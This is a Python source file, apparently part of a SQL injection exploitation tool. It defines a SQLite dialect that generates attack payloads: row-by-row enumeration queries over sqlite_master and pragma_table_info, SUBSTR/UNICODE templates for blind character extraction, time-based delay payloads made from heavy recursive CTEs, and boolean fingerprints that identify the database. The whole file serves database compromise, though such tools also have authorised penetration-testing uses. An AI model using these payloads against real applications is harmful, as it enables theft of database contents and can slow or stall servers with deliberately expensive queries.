"""SQLite 方言"""
from dbms.base import BaseDialect


class SQLiteDialect(BaseDialect):
    name = "sqlite"

    def version_expr(self): return "SQLITE_VERSION()"
    def database_expr(self): return "'main'"
    def current_user_expr(self): return "'n/a'"
    def is_dba_expr(self): return "1"

    def tables_query(self, db_name, idx):
        return (f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {idx}")

    def columns_query(self, table_name, db_name, idx):
        return (f"SELECT name FROM pragma_table_info('{table_name}') LIMIT 1 OFFSET {idx}")

    def column_types_query(self, table_name, db_name, idx):
        return (f"SELECT type FROM pragma_table_info('{table_name}') LIMIT 1 OFFSET {idx}")

    def data_query(self, table_name, column, idx):
        return f"SELECT {column} FROM {table_name} LIMIT 1 OFFSET {idx}"

    def substr_expr(self, sql, pos, length):
        return f"SUBSTR(({sql}),{pos},{length})"

    def ascii_expr(self, sql):
        return f"UNICODE(({sql}))"

    def substr_templates(self):
        return ["SUBSTR(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["UNICODE(({sql}))"]

    def concat_templates(self):
        return ["(({a})||({b})||({c}))"]

    def hex_to_str(self, hexstr):
        # SQLite 的 0x.. 是整数、x'..' 是 blob —— 必须 CAST 成文本才能跟字符串比
        return f"CAST(x'{hexstr}' AS TEXT)"

    def sleep_expr(self, seconds):
        # SQLite 无 SLEEP()，用递归 CTE 制造计算量
        return (f"(SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS "
                f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{max(1, seconds) * 200000}) "
                f"SELECT x FROM c))")

    def sleep_expr_variants(self, seconds):
        return [
            (f"(SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS "
             f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{max(1, seconds) * 200000}) "
             f"SELECT x FROM c))"),
            (f"(SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS "
             f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{max(1, seconds) * 600000}) "
             f"SELECT x FROM c))"),
        ]

    def error_payloads(self, inner):
        return [f"({inner})"]

    def error_fingerprints(self):
        return []

    def error_keywords(self):
        return ["SQLite"]

    def boolean_fingerprints(self):
        # 只放本 DBMS 独有的判据：sqlite_master 在别的库上直接报错。
        # 别再挂 `1=1` 这类在任何库上都成立的写法则 —— 它让字典里第一个参检的方言永远命中。
        return ["(SELECT COUNT(*) FROM sqlite_master)>0"]